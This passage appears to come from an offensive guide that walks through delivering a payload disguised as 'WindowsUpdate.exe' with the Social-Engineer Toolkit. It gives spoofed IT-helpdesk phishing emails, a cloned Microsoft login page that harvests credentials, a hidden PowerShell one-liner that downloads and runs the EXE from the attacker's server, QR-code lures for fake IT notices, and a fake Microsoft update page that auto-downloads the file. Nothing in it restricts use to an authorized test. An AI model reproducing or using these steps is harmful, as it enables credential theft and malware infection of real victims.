- ART EXE already built and on Kali

**Steps:**

1. Start SET:
   ```bash
   sudo setoolkit
   ```

2. Select `1` → Social-Engineering Attacks

3. Select `1` → Spear-Phishing Attack Vectors

4. Select `1` → Perform a Mass Email Attack

5. When asked **"Do you want to use a predefined template or craft your own?"**
   - Select `2` → One-Time Use Email Template

6. Fill in the fields when prompted:
   ```
   From address:    it-helpdesk@yourcompany.com
   From name:       IT Security Operations
   Subject:         [ACTION REQUIRED] Critical Security Patch — Install by EOD
   Send html or plain text? [h/p]:  p
   Body:            Hi [Name],
                    Please run the attached security patch immediately.
                    Archive password: Update2024
                    — IT Security Operations
   ```

7. When asked **"Do you want to attach a file?"** → `yes`

8. Enter the full path to your ART EXE:
   ```
   /home/kali/ART/build/WindowsUpdate.exe
   ```

9. When asked for SMTP settings, enter your relay details:
   ```
   SMTP server:     smtp.gmail.com
   SMTP port:       587
   Username:        your-email@gmail.com
   Password:        your-app-password
   Use TLS:         yes
   ```

10. Enter target email address when prompted.

11. SET sends the email.

✅ **Confirm:** SET prints `Email sent!`. Target receives the email with `WindowsUpdate.exe` attached. When they run it, new Discord channel appears.

---

## SET Vector 12 — Credential Harvester + Redirect to ART Download

SET clones a real website (e.g., Microsoft login), captures credentials when the target logs in, then automatically redirects them to download your ART EXE.

**What you need:**
- Kali machine reachable from target (same network, or use ngrok — see below)
- ART EXE on Kali served via a simple HTTP server

**Steps:**

1. Copy ART EXE into a folder SET can serve:
   ```bash
   mkdir -p /var/www/html/update
   cp /home/kali/ART/build/WindowsUpdate.exe /var/www/html/update/
   ```

2. Start SET:
   ```bash
   sudo setoolkit
   ```

3. Select `1` → Social-Engineering Attacks

4. Select `2` → Website Attack Vectors

5. Select `3` → Credential Harvester Attack Method

6. Select `2` → Site Cloner

7. Enter your Kali IP when asked:
   ```
   IP address for the POST back: 192.168.1.50
   ```

8. Enter the URL to clone:
   ```
   URL to clone: https://login.microsoftonline.com
   ```

9. SET clones the site and starts a web server on port 80.

10. Now set up the redirect: after a target submits their credentials, redirect them to the ART download. Edit SET's harvester config:
    ```bash
    sudo nano /etc/setoolkit/set.config
    ```
    Find and set:
    ```
    HARVESTER_REDIRECT=http://192.168.1.50/update/WindowsUpdate.exe
    ```
    Save and exit (`Ctrl+O` → Enter → `Ctrl+X`).

11. Restart SET and repeat steps 2–9 to apply the new config.

12. Send the target a phishing link to your Kali IP:
    ```
    http://192.168.1.50/
    ```
    Use Template 3 from Vector 2 as the email body.

13. Target visits your cloned login page → enters credentials (SET captures them) → gets redirected to download `WindowsUpdate.exe` → runs it.

✅ **Confirm:** SET terminal shows captured credentials. New Discord channel appears when target runs the EXE.

**Where to find captured credentials:**
```bash
cat /root/.set/reports/2024*
# or
ls /root/.set/reports/
```

---

## SET Vector 12A — Web Delivery (PowerShell One-Liner)

SET generates a PowerShell one-liner that downloads and runs your ART EXE. You deliver this via any existing access — RDP, a chat message, a phishing email body, or a physical attack.

**What you need:**
- Kali machine reachable from target
- ART EXE on Kali

**Steps:**

1. Copy ART EXE to SET's web root:
   ```bash
   sudo cp /home/kali/ART/build/WindowsUpdate.exe /var/www/html/WindowsUpdate.exe
   sudo service apache2 start
   ```

2. Start SET:
   ```bash
   sudo setoolkit
   ```

3. Select `1` → Social-Engineering Attacks

4. Select `9` → Powershell Attack Vectors

5. Select `1` → Powershell Alphanumeric Shellcode Injector

   > SET will ask about shellcode — for ART we skip this and use web delivery instead. Go back and use option below.

   Press `99` or `Ctrl+C` to go back to the main menu.

6. Select `1` → Social-Engineering Attacks → `2` → Website Attack Vectors → `5` → Web Jacking Attack Method

   OR use SET's **multi-attack** web delivery directly:

   From main menu → `1` → `2` → `6` → Multi-Attack Web Method

7. When SET asks for your IP/URL, enter your Kali IP.

8. SET gives you a URL. Your delivery one-liner for the target is:
   ```powershell
   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.50/WindowsUpdate.exe' -OutFile $env:TEMP\WU.exe; Start-Process $env:TEMP\WU.exe"
   ```

9. Deliver this command to the target via:
   - Paste into an open RDP/SSH session
   - Send as a "run this in PowerShell" instruction in a phishing email
   - Type via HID device (Vector 1D)

✅ **Confirm:** Apache access log shows GET request for `WindowsUpdate.exe`. New Discord channel appears.

Check the Apache log:
```bash
tail -f /var/log/apache2/access.log
```

---

## SET Vector 12B — QRCode / SMS Phishing → ART Download Link

SET generates a QR code pointing to your ART download URL. Print it on a fake IT notice and leave it physically, or send it via SMS/chat.

**What you need:**
- SET and `qrencode` on Kali:
  ```bash
  sudo apt install qrencode -y
  ```
- HTTP server running with ART EXE (Vector 4A or Apache above)

**Steps:**

1. Generate a QR code pointing to your ART download URL:
   ```bash
   qrencode -o /tmp/update_qr.png -s 10 "http://192.168.1.50:8080/Microsoft/Security/Update/WindowsUpdate.exe"
   ```

2. View the QR code:
   ```bash
   eog /tmp/update_qr.png
   # or: xdg-open /tmp/update_qr.png
   ```

3. Use it in one of these ways:
   - **Print and leave physically:** Add it to a fake IT notice like *"Scan to install required endpoint update"* and leave near target workstation
   - **Embed in phishing email:** Attach the PNG to an email as an "easy install" option
   - **SET QR integration:** From SET main menu → `1` → `9` → `6` → QRCode Generator Attack Vector — SET automates this with a built-in listener

4. Target scans QR code on their phone or computer → browser opens download URL → they run the EXE.

✅ **Confirm:** GET request in your server window. New Discord channel appears.

---

## SET Vector 12C — Fake Update Page (SET Site Cloner + ART Payload)

Combines SET's site cloner with a lure page that auto-downloads the ART EXE. The most complete SET-based delivery flow.

**What you need:**
- Kali with SET and Apache
- ART EXE on Kali
- ngrok (optional — for reaching targets outside your network)

**Steps:**

1. Copy EXE to Apache web root:
   ```bash
   sudo cp /home/kali/ART/build/WindowsUpdate.exe /var/www/html/
   sudo service apache2 start
   ```

2. Create a lure landing page that auto-downloads the EXE:
   ```bash
   sudo nano /var/www/html/index.html
   ```
   Paste this:
   ```html
   <!DOCTYPE html>
   <html>
   <head>
     <meta charset="UTF-8">
     <title>Microsoft Security Update</title>
     <style>
       body{font-family:"Segoe UI",sans-serif;background:#f3f3f3;display:flex;
            justify-content:center;align-items:center;height:100vh;margin:0}
       .card{background:white;border-radius:4px;padding:40px 50px;
             box-shadow:0 2px 8px rgba(0,0,0,.15);max-width:420px;text-align:center}
       .logo{font-size:26px;color:#0067b8;font-weight:600;margin-bottom:8px}
       p{color:#444;line-height:1.6}
       .note{font-size:11px;color:#aaa;margin-top:16px}
     </style>
     <script>
       setTimeout(function(){
         window.location.href="/WindowsUpdate.exe";
       }, 1500);
     </script>
   </head>
   <body>
     <div class="card">
       <div class="logo">🛡 Microsoft Security</div>
       <h2 style="font-weight:400">Critical Security Update</h2>
       <p>Update KB5040442 is downloading for your device.<br>
          Please run it when complete.</p>
       <p><b>Download starting automatically...</b></p>
       <div class="note">Microsoft Corporation · Privacy · Terms of Use</div>
     </div>
   </body>
   </html>
   ```
   Save: `Ctrl+O` → Enter → `Ctrl+X`

3. (Optional) Expose to the internet with ngrok for targets outside your network:
   ```bash
   ngrok http 80
   ```
   Copy the `https://` URL ngrok gives you.

4. Send the target the URL in a phishing email (Template 4 from Vector 2):
   - Local network: `http://192.168.1.50/`
   - With ngrok: `https://abc123.ngrok-free.app/`

5. Target visits page → sees Microsoft update screen → EXE downloads automatically → they run it.

✅ **Confirm:** Apache access log shows hits:
```bash
tail -f /var/log/apache2/access.log
```
New Discord channel appears when target runs the EXE.

---

### SET Quick Reference

| SET Vector | SET Menu Path | ART Integration |
|---|---|---|
| Spear-phishing email | `1 → 1 → 1` | Attach ART EXE directly |
| Credential harvester | `1 → 2 → 3 → 2` | Redirect post-login to EXE download |
| Web delivery / PowerShell | `1 → 2 → 6` | Serve ART EXE, deliver one-liner |
| QR code attack | `1 → 9 → 6` | QR points to ART download URL |
| Site cloner + lure page | `1 → 2 → 2` + custom index.html | Clone site, serve EXE on same host |

### Useful SET paths on Kali

| Path | What's there |
|---|---|
| `/root/.set/reports/` | Harvested credentials |
| `/var/www/html/` | Apache web root (your served files) |
| `/etc/setoolkit/set.config` | SET configuration (redirects, SMTP, etc.) |
| `/var/log/apache2/access.log` | Incoming requests from targets |
